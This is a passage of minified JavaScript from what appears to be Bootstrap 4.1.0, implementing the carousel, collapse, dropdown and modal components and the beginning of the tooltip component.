P(this._element).trigger(r), r }, t._setActiveIndicatorElement = function (t) { if (this._indicatorsElement) { P(this._indicatorsElement).find(Z.ACTIVE).removeClass(Y); var e = this._indicatorsElement.children[this._getItemIndex(t)]; e && P(e).addClass(Y) } }, t._slide = function (t, e) { var n, i, r, s = this, o = P(this._element).find(Z.ACTIVE_ITEM)[0], a = this._getItemIndex(o), l = e || o && this._getItemByDirection(t, o), h = this._getItemIndex(l), c = Boolean(this._interval); if (t === U ? (n = z, i = X, r = F) : (n = q, i = J, r = V), l && P(l).hasClass(Y)) this._isSliding = !1; else if (!this._triggerSlideEvent(l, r).isDefaultPrevented() && o && l) { this._isSliding = !0, c && this.pause(), this._setActiveIndicatorElement(l); var u = P.Event(Q.SLID, { relatedTarget: l, direction: r, from: a, to: h }); if (P(this._element).hasClass(G)) { P(l).addClass(i), Cn.reflow(l), P(o).addClass(n), P(l).addClass(n); var f = Cn.getTransitionDurationFromElement(o); P(o).one(Cn.TRANSITION_END, function () { P(l).removeClass(n + " " + i).addClass(Y), P(o).removeClass(Y + " " + i + " " + n), s._isSliding = !1, setTimeout(function () { return P(s._element).trigger(u) }, 0) }).emulateTransitionEnd(f) } else P(o).removeClass(Y), P(l).addClass(Y), this._isSliding = !1, P(this._element).trigger(u); c && this.cycle() } }, s._jQueryInterface = function (i) { return this.each(function () { var t = P(this).data(j), e = h({}, M, P(this).data()); "object" == typeof i && (e = h({}, e, i)); var n = "string" == typeof i ? i : e.slide; if (t || (t = new s(this, e), P(this).data(j, t)), "number" == typeof i) t.to(i); else if ("string" == typeof n) { if ("undefined" == typeof t[n]) throw new TypeError('No method named "' + n + '"'); t[n]() } else e.interval && (t.pause(), t.cycle()) }) }, s._dataApiClickHandler = function (t) { var e = Cn.getSelectorFromElement(this); if (e) { var n = P(e)[0]; if (n && P(n).hasClass(B)) { var i = h({}, P(n).data(), P(this).data()), r = this.getAttribute("data-slide-to"); r && (i.interval = !1), s._jQueryInterface.call(P(n), i), r && P(n).data(j).to(r), t.preventDefault() } } }, o(s, null, [{ key: "VERSION", get: function () { return "4.1.0" } }, { key: "Default", get: function () { return M } }]), s }(), P(document).on(Q.CLICK_DATA_API, Z.DATA_SLIDE, $._dataApiClickHandler), P(window).on(Q.LOAD_DATA_API, function () { P(Z.DATA_RIDE).each(function () { var t = P(this); $._jQueryInterface.call(t, t.data()) }) }), P.fn[L] = $._jQueryInterface, P.fn[L].Constructor = $, P.fn[L].noConflict = function () { return P.fn[L] = W, $._jQueryInterface }, $), bn = (et = "collapse", it = "." + (nt = "bs.collapse"), rt = (tt = e).fn[et], st = { toggle: !0, parent: "" }, ot = { toggle: "boolean", parent: "(string|element)" }, at = { SHOW: "show" + it, SHOWN: "shown" + it, HIDE: "hide" + it, HIDDEN: "hidden" + it, CLICK_DATA_API: "click" + it + ".data-api" }, lt = "show", ht = "collapse", ct = "collapsing", ut = "collapsed", ft = "width", dt = "height", _t = { ACTIVES: ".show, .collapsing", DATA_TOGGLE: '[data-toggle="collapse"]' }, gt = function () { function a(t, e) { this._isTransitioning = !1, this._element = t, this._config = this._getConfig(e), this._triggerArray = tt.makeArray(tt('[data-toggle="collapse"][href="#' + t.id + '"],[data-toggle="collapse"][data-target="#' + t.id + '"]')); for (var n = tt(_t.DATA_TOGGLE), i = 0; i < n.length; i++) { var r = n[i], s = Cn.getSelectorFromElement(r); null !== s && 0 < tt(s).filter(t).length && (this._selector = s, this._triggerArray.push(r)) } this._parent = this._config.parent ? this._getParent() : null, this._config.parent || this._addAriaAndCollapsedClass(this._element, this._triggerArray), this._config.toggle && this.toggle() } var t = a.prototype; return t.toggle = function () { tt(this._element).hasClass(lt) ? this.hide() : this.show() }, t.show = function () { var t, e, n = this; if (!this._isTransitioning && !tt(this._element).hasClass(lt) && (this._parent && 0 === (t = tt.makeArray(tt(this._parent).find(_t.ACTIVES).filter('[data-parent="' + this._config.parent + '"]'))).length && (t = null), !(t && (e = tt(t).not(this._selector).data(nt)) && e._isTransitioning))) { var i = tt.Event(at.SHOW); if (tt(this._element).trigger(i), !i.isDefaultPrevented()) { t && (a._jQueryInterface.call(tt(t).not(this._selector), "hide"), e || tt(t).data(nt, null)); var r = this._getDimension(); tt(this._element).removeClass(ht).addClass(ct), (this._element.style[r] = 0) < this._triggerArray.length && tt(this._triggerArray).removeClass(ut).attr("aria-expanded", !0), this.setTransitioning(!0); var s = "scroll" + (r[0].toUpperCase() + r.slice(1)), o = Cn.getTransitionDurationFromElement(this._element); tt(this._element).one(Cn.TRANSITION_END, function () { tt(n._element).removeClass(ct).addClass(ht).addClass(lt), n._element.style[r] = "", n.setTransitioning(!1), tt(n._element).trigger(at.SHOWN) }).emulateTransitionEnd(o), this._element.style[r] = this._element[s] + "px" } } }, t.hide = function () { var t = this; if (!this._isTransitioning && tt(this._element).hasClass(lt)) { var e = tt.Event(at.HIDE); if (tt(this._element).trigger(e), !e.isDefaultPrevented()) { var n = this._getDimension(); if (this._element.style[n] = this._element.getBoundingClientRect()[n] + "px", Cn.reflow(this._element), tt(this._element).addClass(ct).removeClass(ht).removeClass(lt), 0 < this._triggerArray.length) for (var i = 0; i < this._triggerArray.length; i++) { var r = this._triggerArray[i], s = Cn.getSelectorFromElement(r); if (null !== s) tt(s).hasClass(lt) || tt(r).addClass(ut).attr("aria-expanded", !1) } this.setTransitioning(!0); this._element.style[n] = ""; var o = Cn.getTransitionDurationFromElement(this._element); tt(this._element).one(Cn.TRANSITION_END, function () { t.setTransitioning(!1), tt(t._element).removeClass(ct).addClass(ht).trigger(at.HIDDEN) }).emulateTransitionEnd(o) } } }, t.setTransitioning = function (t) { this._isTransitioning = t }, t.dispose = function () { tt.removeData(this._element, nt), this._config = null, this._parent = null, this._element = null, this._triggerArray = null, this._isTransitioning = null }, t._getConfig = function (t) { return (t = h({}, st, t)).toggle = Boolean(t.toggle), Cn.typeCheckConfig(et, t, ot), t }, t._getDimension = function () { return tt(this._element).hasClass(ft) ? ft : dt }, t._getParent = function () { var n = this, t = null; Cn.isElement(this._config.parent) ? (t = this._config.parent, "undefined" != typeof this._config.parent.jquery && (t = this._config.parent[0])) : t = tt(this._config.parent)[0]; var e = '[data-toggle="collapse"][data-parent="' + this._config.parent + '"]'; return tt(t).find(e).each(function (t, e) { n._addAriaAndCollapsedClass(a._getTargetFromElement(e), [e]) }), t }, t._addAriaAndCollapsedClass = function (t, e) { if (t) { var n = tt(t).hasClass(lt); 0 < e.length && tt(e).toggleClass(ut, !n).attr("aria-expanded", n) } }, a._getTargetFromElement = function (t) { var e = Cn.getSelectorFromElement(t); return e ? tt(e)[0] : null }, a._jQueryInterface = function (i) { return this.each(function () { var t = tt(this), e = t.data(nt), n = h({}, st, t.data(), "object" == typeof i && i); if (!e && n.toggle && /show|hide/.test(i) && (n.toggle = !1), e || (e = new a(this, n), t.data(nt, e)), "string" == typeof i) { if ("undefined" == typeof e[i]) throw new TypeError('No method named "' + i + '"'); e[i]() } }) }, o(a, null, [{ key: "VERSION", get: function () { return "4.1.0" } }, { key: "Default", get: function () { return st } }]), a }(), tt(document).on(at.CLICK_DATA_API, _t.DATA_TOGGLE, function (t) { "A" === t.currentTarget.tagName && t.preventDefault(); var n = tt(this), e = Cn.getSelectorFromElement(this); tt(e).each(function () { var t = tt(this), e = t.data(nt) ? "toggle" : n.data(); gt._jQueryInterface.call(t, e) }) }), tt.fn[et] = gt._jQueryInterface, tt.fn[et].Constructor = gt, tt.fn[et].noConflict = function () { return tt.fn[et] = rt, gt._jQueryInterface }, gt), Sn = (pt = "dropdown", Et = "." + (vt = "bs.dropdown"), yt = ".data-api", Tt = (mt = e).fn[pt], Ct = new RegExp("38|40|27"), It = { HIDE: "hide" + Et, HIDDEN: "hidden" + Et, SHOW: "show" + Et, SHOWN: "shown" + Et, CLICK: "click" + Et, CLICK_DATA_API: "click" + Et + yt, KEYDOWN_DATA_API: "keydown" + Et + yt, KEYUP_DATA_API: "keyup" + Et + yt }, At = "disabled", Dt = "show", bt = "dropup", St = "dropright", wt = "dropleft", Nt = "dropdown-menu-right", Ot = "position-static", kt = '[data-toggle="dropdown"]', Pt = ".dropdown form", Lt = ".dropdown-menu", jt = ".navbar-nav", Rt = ".dropdown-menu .dropdown-item:not(.disabled):not(:disabled)", Ht = "top-start", Wt = "top-end", Mt = "bottom-start", xt = "bottom-end", Ut = "right-start", Kt = "left-start", Ft = { offset: 0, flip: !0, boundary: "scrollParent", reference: "toggle", display: "dynamic" }, Vt = { offset: "(number|string|function)", flip: "boolean", boundary: "(string|element)", reference: "(string|element)", display: "string" }, Qt = function () { function l(t, e) { this._element = t, this._popper = null, this._config = this._getConfig(e), this._menu = this._getMenuElement(), this._inNavbar = this._detectNavbar(), this._addEventListeners() } var t = l.prototype; return t.toggle = function () { if (!this._element.disabled && !mt(this._element).hasClass(At)) { var t = l._getParentFromElement(this._element), e = mt(this._menu).hasClass(Dt); if (l._clearMenus(), !e) { var n = { relatedTarget: this._element }, i = mt.Event(It.SHOW, n); if (mt(t).trigger(i), !i.isDefaultPrevented()) { if (!this._inNavbar) { if ("undefined" == typeof c) throw new TypeError("Bootstrap dropdown require Popper.js (https://popper.js.org)"); var r = this._element; "parent" === this._config.reference ? r = t : Cn.isElement(this._config.reference) && (r = this._config.reference, "undefined" != typeof this._config.reference.jquery && (r = this._config.reference[0])), "scrollParent" !== this._config.boundary && mt(t).addClass(Ot), this._popper = new c(r, this._menu, this._getPopperConfig()) } "ontouchstart" in document.documentElement && 0 === mt(t).closest(jt).length && mt(document.body).children().on("mouseover", null, mt.noop), this._element.focus(), this._element.setAttribute("aria-expanded", !0), mt(this._menu).toggleClass(Dt), mt(t).toggleClass(Dt).trigger(mt.Event(It.SHOWN, n)) } } } }, t.dispose = function () { mt.removeData(this._element, vt), mt(this._element).off(Et), this._element = null, (this._menu = null) !== this._popper && (this._popper.destroy(), this._popper = null) }, t.update = function () { this._inNavbar = this._detectNavbar(), null !== this._popper && this._popper.scheduleUpdate() }, t._addEventListeners = function () { var e = this; mt(this._element).on(It.CLICK, function (t) { t.preventDefault(), t.stopPropagation(), e.toggle() }) }, t._getConfig = function (t) { return t = h({}, this.constructor.Default, mt(this._element).data(), t), Cn.typeCheckConfig(pt, t, this.constructor.DefaultType), t }, t._getMenuElement = function () { if (!this._menu) { var t = l._getParentFromElement(this._element); this._menu = mt(t).find(Lt)[0] } return this._menu }, t._getPlacement = function () { var t = mt(this._element).parent(), e = Mt; return t.hasClass(bt) ? (e = Ht, mt(this._menu).hasClass(Nt) && (e = Wt)) : t.hasClass(St) ? e = Ut : t.hasClass(wt) ? e = Kt : mt(this._menu).hasClass(Nt) && (e = xt), e }, t._detectNavbar = function () { return 0 < mt(this._element).closest(".navbar").length }, t._getPopperConfig = function () { var e = this, t = {}; "function" == typeof this._config.offset ? t.fn = function (t) { return t.offsets = h({}, t.offsets, e._config.offset(t.offsets) || {}), t } : t.offset = this._config.offset; var n = { placement: this._getPlacement(), modifiers: { offset: t, flip: { enabled: this._config.flip }, preventOverflow: { boundariesElement: this._config.boundary } } }; return "static" === this._config.display && (n.modifiers.applyStyle = { enabled: !1 }), n }, l._jQueryInterface = function (e) { return this.each(function () { var t = mt(this).data(vt); if (t || (t = new l(this, "object" == typeof e ? e : null), mt(this).data(vt, t)), "string" == typeof e) { if ("undefined" == typeof t[e]) throw new TypeError('No method named "' + e + '"'); t[e]() } }) }, l._clearMenus = function (t) { if (!t || 3 !== t.which && ("keyup" !== t.type || 9 === t.which)) for (var e = mt.makeArray(mt(kt)), n = 0; n < e.length; n++) { var i = l._getParentFromElement(e[n]), r = mt(e[n]).data(vt), s = { relatedTarget: e[n] }; if (r) { var o = r._menu; if (mt(i).hasClass(Dt) && !(t && ("click" === t.type && /input|textarea/i.test(t.target.tagName) || "keyup" === t.type && 9 === t.which) && mt.contains(i, t.target))) { var a = mt.Event(It.HIDE, s); mt(i).trigger(a), a.isDefaultPrevented() || ("ontouchstart" in document.documentElement && mt(document.body).children().off("mouseover", null, mt.noop), e[n].setAttribute("aria-expanded", "false"), mt(o).removeClass(Dt), mt(i).removeClass(Dt).trigger(mt.Event(It.HIDDEN, s))) } } } }, l._getParentFromElement = function (t) { var e, n = Cn.getSelectorFromElement(t); return n && (e = mt(n)[0]), e || t.parentNode }, l._dataApiKeydownHandler = function (t) { if ((/input|textarea/i.test(t.target.tagName) ? !(32 === t.which || 27 !== t.which && (40 !== t.which && 38 !== t.which || mt(t.target).closest(Lt).length)) : Ct.test(t.which)) && (t.preventDefault(), t.stopPropagation(), !this.disabled && !mt(this).hasClass(At))) { var e = l._getParentFromElement(this), n = mt(e).hasClass(Dt); if ((n || 27 === t.which && 32 === t.which) && (!n || 27 !== t.which && 32 !== t.which)) { var i = mt(e).find(Rt).get(); if (0 !== i.length) { var r = i.indexOf(t.target); 38 === t.which && 0 < r && r--, 40 === t.which && r < i.length - 1 && r++, r < 0 && (r = 0), i[r].focus() } } else { if (27 === t.which) { var s = mt(e).find(kt)[0]; mt(s).trigger("focus") } mt(this).trigger("click") } } }, o(l, null, [{ key: "VERSION", get: function () { return "4.1.0" } }, { key: "Default", get: function () { return Ft } }, { key: "DefaultType", get: function () { return Vt } }]), l }(), mt(document).on(It.KEYDOWN_DATA_API, kt, Qt._dataApiKeydownHandler).on(It.KEYDOWN_DATA_API, Lt, Qt._dataApiKeydownHandler).on(It.CLICK_DATA_API + " " + It.KEYUP_DATA_API, Qt._clearMenus).on(It.CLICK_DATA_API, kt, function (t) { t.preventDefault(), t.stopPropagation(), Qt._jQueryInterface.call(mt(this), "toggle") }).on(It.CLICK_DATA_API, Pt, function (t) { t.stopPropagation() }), mt.fn[pt] = Qt._jQueryInterface, mt.fn[pt].Constructor = Qt, mt.fn[pt].noConflict = function () { return mt.fn[pt] = Tt, Qt._jQueryInterface }, Qt), wn = (Yt = "modal", qt = "." + (Gt = "bs.modal"), zt = (Bt = e).fn[Yt], Xt = { backdrop: !0, keyboard: !0, focus: !0, show: !0 }, Jt = { backdrop: "(boolean|string)", keyboard: "boolean", focus: "boolean", show: "boolean" }, Zt = { HIDE: "hide" + qt, HIDDEN: "hidden" + qt, SHOW: "show" + qt, SHOWN: "shown" + qt, FOCUSIN: "focusin" + qt, RESIZE: "resize" + qt, CLICK_DISMISS: "click.dismiss" + qt, KEYDOWN_DISMISS: "keydown.dismiss" + qt, MOUSEUP_DISMISS: "mouseup.dismiss" + qt, MOUSEDOWN_DISMISS: "mousedown.dismiss" + qt, CLICK_DATA_API: "click" + qt + ".data-api" }, $t = "modal-scrollbar-measure", te = "modal-backdrop", ee = "modal-open", ne = "fade", ie = "show", re = { DIALOG: ".modal-dialog", DATA_TOGGLE: '[data-toggle="modal"]', DATA_DISMISS: '[data-dismiss="modal"]', FIXED_CONTENT: ".fixed-top, .fixed-bottom, .is-fixed, .sticky-top", STICKY_CONTENT: ".sticky-top", NAVBAR_TOGGLER: ".navbar-toggler" }, se = function () { function r(t, e) { this._config = this._getConfig(e), this._element = t, this._dialog = Bt(t).find(re.DIALOG)[0], this._backdrop = null, this._isShown = !1, this._isBodyOverflowing = !1, this._ignoreBackdropClick = !1, this._scrollbarWidth = 0 } var t = r.prototype; return t.toggle = function (t) { return this._isShown ? this.hide() : this.show(t) }, t.show = function (t) { var e = this; if (!this._isTransitioning && !this._isShown) { Bt(this._element).hasClass(ne) && (this._isTransitioning = !0); var n = Bt.Event(Zt.SHOW, { relatedTarget: t }); Bt(this._element).trigger(n), this._isShown || n.isDefaultPrevented() || (this._isShown = !0, this._checkScrollbar(), this._setScrollbar(), this._adjustDialog(), Bt(document.body).addClass(ee), this._setEscapeEvent(), this._setResizeEvent(), Bt(this._element).on(Zt.CLICK_DISMISS, re.DATA_DISMISS, function (t) { return e.hide(t) }), Bt(this._dialog).on(Zt.MOUSEDOWN_DISMISS, function () { Bt(e._element).one(Zt.MOUSEUP_DISMISS, function (t) { Bt(t.target).is(e._element) && (e._ignoreBackdropClick = !0) }) }), this._showBackdrop(function () { return e._showElement(t) })) } }, t.hide = function (t) { var e = this; if (t && t.preventDefault(), !this._isTransitioning && this._isShown) { var n = Bt.Event(Zt.HIDE); if (Bt(this._element).trigger(n), this._isShown && !n.isDefaultPrevented()) { this._isShown = !1; var i = Bt(this._element).hasClass(ne); if (i && (this._isTransitioning = !0), this._setEscapeEvent(), this._setResizeEvent(), Bt(document).off(Zt.FOCUSIN), Bt(this._element).removeClass(ie), Bt(this._element).off(Zt.CLICK_DISMISS), Bt(this._dialog).off(Zt.MOUSEDOWN_DISMISS), i) { var r = Cn.getTransitionDurationFromElement(this._element); Bt(this._element).one(Cn.TRANSITION_END, function (t) { return e._hideModal(t) }).emulateTransitionEnd(r) } else this._hideModal() } } }, t.dispose = function () { Bt.removeData(this._element, Gt), Bt(window, document, this._element, this._backdrop).off(qt), this._config = null, this._element = null, this._dialog = null, this._backdrop = null, this._isShown = null, this._isBodyOverflowing = null, this._ignoreBackdropClick = null, this._scrollbarWidth = null }, t.handleUpdate = function () { this._adjustDialog() }, t._getConfig = function (t) { return t = h({}, Xt, t), Cn.typeCheckConfig(Yt, t, Jt), t }, t._showElement = function (t) { var e = this, n = Bt(this._element).hasClass(ne); this._element.parentNode && this._element.parentNode.nodeType === Node.ELEMENT_NODE || document.body.appendChild(this._element), this._element.style.display = "block", this._element.removeAttribute("aria-hidden"), this._element.scrollTop = 0, n && Cn.reflow(this._element), Bt(this._element).addClass(ie), this._config.focus && this._enforceFocus(); var i = Bt.Event(Zt.SHOWN, { relatedTarget: t }), r = function () { e._config.focus && e._element.focus(), e._isTransitioning = !1, Bt(e._element).trigger(i) }; if (n) { var s = Cn.getTransitionDurationFromElement(this._element); Bt(this._dialog).one(Cn.TRANSITION_END, r).emulateTransitionEnd(s) } else r() }, t._enforceFocus = function () { var e = this; Bt(document).off(Zt.FOCUSIN).on(Zt.FOCUSIN, function (t) { document !== t.target && e._element !== t.target && 0 === Bt(e._element).has(t.target).length && e._element.focus() }) }, t._setEscapeEvent = function () { var e = this; this._isShown && this._config.keyboard ? Bt(this._element).on(Zt.KEYDOWN_DISMISS, function (t) { 27 === t.which && (t.preventDefault(), e.hide()) }) : this._isShown || Bt(this._element).off(Zt.KEYDOWN_DISMISS) }, t._setResizeEvent = function () { var e = this; this._isShown ? Bt(window).on(Zt.RESIZE, function (t) { return e.handleUpdate(t) }) : Bt(window).off(Zt.RESIZE) }, t._hideModal = function () { var t = this; this._element.style.display = "none", this._element.setAttribute("aria-hidden", !0), this._isTransitioning = !1, this._showBackdrop(function () { Bt(document.body).removeClass(ee), t._resetAdjustments(), t._resetScrollbar(), Bt(t._element).trigger(Zt.HIDDEN) }) }, t._removeBackdrop = function () { this._backdrop && (Bt(this._backdrop).remove(), this._backdrop = null) }, t._showBackdrop = function (t) { var e = this, n = Bt(this._element).hasClass(ne) ? ne : ""; if (this._isShown && this._config.backdrop) { if (this._backdrop = document.createElement("div"), this._backdrop.className = te, n && Bt(this._backdrop).addClass(n), Bt(this._backdrop).appendTo(document.body), Bt(this._element).on(Zt.CLICK_DISMISS, function (t) { e._ignoreBackdropClick ? e._ignoreBackdropClick = !1 : t.target === t.currentTarget && ("static" === e._config.backdrop ? e._element.focus() : e.hide()) }), n && Cn.reflow(this._backdrop), Bt(this._backdrop).addClass(ie), !t) return; if (!n) return void t(); var i = Cn.getTransitionDurationFromElement(this._backdrop); Bt(this._backdrop).one(Cn.TRANSITION_END, t).emulateTransitionEnd(i) } else if (!this._isShown && this._backdrop) { Bt(this._backdrop).removeClass(ie); var r = function () { e._removeBackdrop(), t && t() }; if (Bt(this._element).hasClass(ne)) { var s = Cn.getTransitionDurationFromElement(this._backdrop); Bt(this._backdrop).one(Cn.TRANSITION_END, r).emulateTransitionEnd(s) } else r() } else t && t() }, t._adjustDialog = function () { var t = this._element.scrollHeight > document.documentElement.clientHeight; !this._isBodyOverflowing && t && (this._element.style.paddingLeft = this._scrollbarWidth + "px"), this._isBodyOverflowing && !t && (this._element.style.paddingRight = this._scrollbarWidth + "px") }, t._resetAdjustments = function () { this._element.style.paddingLeft = "", this._element.style.paddingRight = "" }, t._checkScrollbar = function () { var t = document.body.getBoundingClientRect(); this._isBodyOverflowing = t.left + t.right < window.innerWidth, this._scrollbarWidth = this._getScrollbarWidth() }, t._setScrollbar = function () { var r = this; if (this._isBodyOverflowing) { Bt(re.FIXED_CONTENT).each(function (t, e) { var n = Bt(e)[0].style.paddingRight, i = Bt(e).css("padding-right"); Bt(e).data("padding-right", n).css("padding-right", parseFloat(i) + r._scrollbarWidth + "px") }), Bt(re.STICKY_CONTENT).each(function (t, e) { var n = Bt(e)[0].style.marginRight, i = Bt(e).css("margin-right"); Bt(e).data("margin-right", n).css("margin-right", parseFloat(i) - r._scrollbarWidth + "px") }), Bt(re.NAVBAR_TOGGLER).each(function (t, e) { var n = Bt(e)[0].style.marginRight, i = Bt(e).css("margin-right"); Bt(e).data("margin-right", n).css("margin-right", parseFloat(i) + r._scrollbarWidth + "px") }); var t = document.body.style.paddingRight, e = Bt(document.body).css("padding-right"); Bt(document.body).data("padding-right", t).css("padding-right", parseFloat(e) + this._scrollbarWidth + "px") } }, t._resetScrollbar = function () { Bt(re.FIXED_CONTENT).each(function (t, e) { var n = Bt(e).data("padding-right"); "undefined" != typeof n && Bt(e).css("padding-right", n).removeData("padding-right") }), Bt(re.STICKY_CONTENT + ", " + re.NAVBAR_TOGGLER).each(function (t, e) { var n = Bt(e).data("margin-right"); "undefined" != typeof n && Bt(e).css("margin-right", n).removeData("margin-right") }); var t = Bt(document.body).data("padding-right"); "undefined" != typeof t && Bt(document.body).css("padding-right", t).removeData("padding-right") }, t._getScrollbarWidth = function () { var t = document.createElement("div"); t.className = $t, document.body.appendChild(t); var e = t.getBoundingClientRect().width - t.clientWidth; return document.body.removeChild(t), e }, r._jQueryInterface = function (n, i) { return this.each(function () { var t = Bt(this).data(Gt), e = h({}, r.Default, Bt(this).data(), "object" == typeof n && n); if (t || (t = new r(this, e), Bt(this).data(Gt, t)), "string" == typeof n) { if ("undefined" == typeof t[n]) throw new TypeError('No method named "' + n + '"'); t[n](i) } else e.show && t.show(i) }) }, o(r, null, [{ key: "VERSION", get: function () { return "4.1.0" } }, { key: "Default", get: function () { return Xt } }]), r }(), Bt(document).on(Zt.CLICK_DATA_API, re.DATA_TOGGLE, function (t) { var e, n = this, i = Cn.getSelectorFromElement(this); i && (e = Bt(i)[0]); var r = Bt(e).data(Gt) ? "toggle" : h({}, Bt(e).data(), Bt(this).data()); "A" !== this.tagName && "AREA" !== this.tagName || t.preventDefault(); var s = Bt(e).one(Zt.SHOW, function (t) { t.isDefaultPrevented() || s.one(Zt.HIDDEN, function () { Bt(n).is(":visible") && n.focus() }) }); se._jQueryInterface.call(Bt(e), r, this) }), Bt.fn[Yt] = se._jQueryInterface, Bt.fn[Yt].Constructor = se, Bt.fn[Yt].noConflict = function () { return Bt.fn[Yt] = zt, se._jQueryInterface }, se), Nn = (ae = "tooltip", he = "." + (le = "bs.tooltip"), ce = (oe = e).fn[ae], ue = "bs-tooltip", fe = new RegExp("(^|\\s)" + ue + "\\S+", "g"), ge = { animation: !0, template: '<div class="tooltip" role="tooltip"><div class="arrow"></div><div class="tooltip-inner"></div></div>', trigger: "hover focus", title: "", delay: 0, html: !(_e = { AUTO: "auto", TOP: "top", RIGHT: "right", BOTTOM: "bottom", LEFT: "left" }), selector: !(de = { animation: "boolean", template: "string", title: "(string|element|function)", trigger: "string", delay: "(number|object)", html: "boolean", selector: "(string|boolean)", placement: "(string|function)", offset: "(number|string)", container: "(string|element|boolean)", fallbackPlacement: "(string|array)", boundary: "(string|element)" }), placement: "top", offset: 0, container: !1, fallbackPlacement: "flip", boundary: "scrollParent" }, pe = "out", ve = { HIDE: "hide" + he, HIDDEN: "hidden" + he, SHOW: (me = "show") + he, SHOWN: "shown" + he, INSERTED: "inserted" + he, CLICK: "click" + he, FOCUSIN: "focusin" + he, FOCUSOUT: "focusout" + he, MOUSEENTER: "mouseenter" + he, MOUSELEAVE: "mouseleave" + he }, Ee = "fade", ye = "show", Te = ".tooltip-inner", Ce = ".arrow", Ie = "hover", Ae = "focus", De = "click", be = "manual", Se = function () { function i(t, e) { if ("undefined" == typeof c) throw new TypeError("Bootstrap tooltips require Popper.js (https://popper.js.org)"); this._isEnabled = !0, this._timeout = 0, this._hoverState = "", this._activeTrigger = {}, this._popper = null, this.element = t, this.config = this._getConfig(e), this.tip = null, this._setListeners() } var t = i.prototype; return t.enable = function () { this._isEnabled = !0 }, t.disable = function () { this._isEnabled = !1 }, t.toggleEnabled = function () { this._isEnabled = !this._isEnabled }, t.toggle = function (t) { if (this._isEnabled) if (t) { var e = this.constructor.DATA_KEY, n = oe(t.currentTarget).data(e); n || (n = new this.constructor(t.currentTarget, this._getDelegateConfig()), oe(t.currentTarget).data(e, n)), n._activeTrigger.click = !n._activeTrigger.click, n._isWithActiveTrigger() ? n._enter(null, n) : n._leave(null, n) } else { if (oe(this.getTipElement()).hasClass(ye)) return void this._leave(null, this); this._enter(null, this) } }, t.dispose = function () { clearTimeout(this._timeout), oe.removeData(this.element, this.constructor.DATA_KEY), oe(this.element).off(this.constructor.EVENT_KEY), oe(this.element).closest(".modal").off("hide.bs.modal"), this.tip && oe(this.tip).remove(), this._isEnabled = null, this._timeout = null, this._hoverState = null, (this._activeTrigger = null) !== this._popper && this._popper.destroy(), this._popper = null, this.element = null, this.config = null, this.tip = null }, t.show = function () { var e = this; if ("none" === oe(this.element).css("display")) throw new Error("Please use show on visible elements"); var t = oe.Event(this.constructor.Event.SHOW); if (this.isWithContent() && this._isEnabled) { oe(this.element).trigger(t); var n = oe.contains(this.element.ownerDocument.documentElement, this.element); if (t.isDefaultPrevented() || !n) return; var i = this.getTipElement(), r = Cn.getUID(this.constructor.NAME); i.setAttribute("id", r), this.element.setAttribute("aria-describedby", r), this.setContent(), this.config.animation && oe(i).addClass(Ee); var s = "function" == typeof this.config.placement ? this.config.placement.call(this, i, this.element) : this.config.placement, o = this._getAttachment(s); this.addAttachmentClass(o); var a = !1 === this.config.container ? document.body : oe(this.config.container); oe(i).data(this.constructor.DATA_KEY, this), oe.contains(this.element.ownerDocument.documentElement, this.tip) || oe(i).appendTo(a), oe(this.element).trigger(this.constructor.Event.INSERTED), this._popper = new c(this.element, i, { placement: o, modifiers: { offset: { offset: this.config.offset }, flip: { behavior: this.config.fallbackPlacement }, arrow: { element: Ce }, preventOverflow: { boundariesElement: this.config.boundary } }, onCreate: function (t) { t.originalPlacement !== t.placement && e._handlePopperPlacementChange(t) }, onUpdate: function (t) { e._handlePopperPlacementChange(t) } }), oe(i).addClass(ye), "ontouchstart" in document.documentElement && oe(document.body).children().on("mouseover", null, oe.noop); var l = function () { e.config.animation && e._fixTransition(); var t = e._hoverState; e._hoverState = null, oe(e.element).trigger(e.constructor.Event.SHOWN), t === pe && e._leave(null, e) }; if (oe(this.tip).hasClass(Ee)) { var h = Cn.getTransitionDurationFromElement(this.tip); oe(this.tip).one(Cn.TRANSITION_END, l).emulateTransitionEnd(h) } else l() } }, t.hide = function (t) { var e = this, n = this.getTipElement(), i = oe.Event(this.constructor.Event.HIDE), r = function () { e._hoverState !== me && n.parentNode && n.parentNode.removeChild(n), e._cleanTipClass(), e.element.removeAttribute("aria-describedby"), oe(e.element).trigger(e.constructor.Event.HIDDEN), null !== e._popper && e._popper.destroy(), t && t() }; if (oe(this.element).trigger(i), !i.isDefaultPrevented()) { if (oe(n).removeClass(ye), "ontouchstart" in document.documentElement && oe(document.body).children().off("mouseover", null, oe.noop), this._activeTrigger[De] = !1, this._activeTrigger[Ae] = !1, this._activeTrigger[Ie] = !1, oe(this.tip).hasClass(Ee)) { var s = Cn.getTransitionDurationFromElement(n); oe(n).one(Cn.TRANSITION_END, r).emulateTransitionEnd(s) } else r(); this._hoverState = "" } }, t.update = function () { null !== this._popper && this._popper.scheduleUpdate() }, t.isWithContent = function () { return Boolean(this.getTitle()) }, t.addAttachmentClass = function (t) { oe(this.getTipElement()).addClass(ue + "-" + t) }, t.getTipElement = function () { return this.tip = this.tip || oe(this.config.template)[0], this.tip }, t.setContent = function () { var t = oe(this.getTipElement()); this.setElementContent(t.find(Te), this.getTitle()), t.removeClass(Ee + " " + ye) }, t.setElementContent = function (t, e) { var n = this.config.html; "object" == typeof e && (e.nodeType || e.jquery) ? n ? oe(e).parent().is(t) || t.empty().append(e) : t.text(oe(e).text()) : t[n ? "html" : "text"](e) }, t.getTitle = function () { var t = this.element.getAttribute("data-original-title"); return t || (t = "function" == typeof this.config.title ? this.config.title.call(this.element) : this.config.title), t }, t._getAttachment = function (t) { return _e[t.toUpperCase()] }, t._setListeners = function () { var i = this; this.config.trigger.split(" ").forEach(function (t) { if ("click" === t) oe(i.element).on(i.constructor.Event.CLICK, i.config.selector, function (t) { return i.toggle(t) }); else if (t !== be) { var e = t === Ie ? i.constructor.Event.MOUSEENTER : i.constructor.Event.FOCUSIN, n = t === Ie ? i.constructor.Event.MOUSELEAVE : i.constructor.Event.FOCUSOUT; oe(i.element).on(e, i.config.selector, function (t) { return i._enter(t) }).on(n, i.config.selector, function (t) { return i._leave(t) }) } oe(i.element).closest(".modal").on("hide.bs.modal", function () { return i.hide() }) }), this.config.selector ? this.config = h({}, this.config, { trigger: "manual", selector: "" }) : this._fixTitle() }, t._fixTitle = function () { var t = typeof this.element.getAttribute("data-original-title"); (this.element.getAttribute("title") || "string" !== t) && (this.element.setAttribute("data-original-title", this.element.getAttribute("title") || ""), this.element.setAttribute("title", "")) }, t._enter = function (t, e) { var n = this.constructor.DATA_KEY; (e = e || oe(t.currentTarget).data(n)) || (e = new 